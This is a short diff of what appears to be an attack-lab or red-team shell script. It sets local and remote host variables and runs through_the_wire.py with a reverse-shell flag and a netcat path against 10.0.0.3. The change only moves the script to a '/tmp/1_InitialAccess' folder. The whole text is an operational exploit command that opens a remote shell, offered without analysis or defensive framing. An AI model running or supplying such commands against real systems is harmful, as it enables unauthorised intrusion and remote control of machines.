@@ -9,4 +9,4 @@ LHOSTPORT=4242
 RHOST=10.0.0.3
 RHOSTPORT=8090
 
-python3 through_the_wire.py --lhost $LHOST --lport $LHOSTPORT --rhost $RHOST --rport $RHOSTPORT --reverse-shell --protocol http:// --nc-path /bin/netcat
+python3 /tmp/1_InitialAccess/through_the_wire.py --lhost $LHOST --lport $LHOSTPORT --rhost $RHOST --rport $RHOSTPORT --reverse-shell --protocol http:// --nc-path /bin/netcat
